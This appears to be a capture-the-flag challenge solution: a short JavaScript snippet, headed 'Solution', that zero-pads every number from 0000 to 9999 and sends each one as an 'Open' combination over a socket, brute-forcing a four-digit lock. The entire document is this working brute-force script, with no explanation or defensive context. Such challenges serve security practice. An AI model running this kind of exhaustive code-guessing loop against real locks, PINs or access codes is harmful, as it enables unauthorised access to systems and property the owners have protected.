## Solution
```
function addwhitespace(i){
	t = (""+i).length;
	z="";
	for(x=t;x<4;x++){
    		z+="0";
	}
	return z+i
}

function unlock2(i){
	socket.emit('message', { "Type": "Open", "Combo": i });
}

for(i=0;i<10000;i++){
	p = addwhitespace(i)
	unlock2(p)
}
```
